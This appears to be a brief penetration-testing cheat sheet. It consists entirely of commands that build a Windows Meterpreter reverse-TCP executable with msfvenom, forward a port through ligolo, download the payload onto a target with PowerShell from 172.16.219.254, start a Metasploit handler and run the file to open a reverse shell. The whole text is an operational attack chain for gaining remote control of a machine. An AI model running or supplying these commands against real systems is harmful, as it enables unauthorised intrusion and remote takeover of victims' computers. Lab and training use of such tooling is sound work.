msfvenom
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.219.254 LPORT=3326 -f exe -o pe.exe
```

ligolo proxy add
```
listener_add --addr 0.0.0.0:3326 --to 0.0.0.0:3326
```

download payload
```
iwr http://172.16.219.254:1235/pe.exe -outfile pe.exe
```

start multi/handler
```
msfconsole -q -x 'use exploit/multi/handler;set LHOST 0.0.0.0;set LPORT 3326;set payload windows/x64/meterpreter/reverse_tcp;run'
```

start revshell
```
.\pe.exe
```
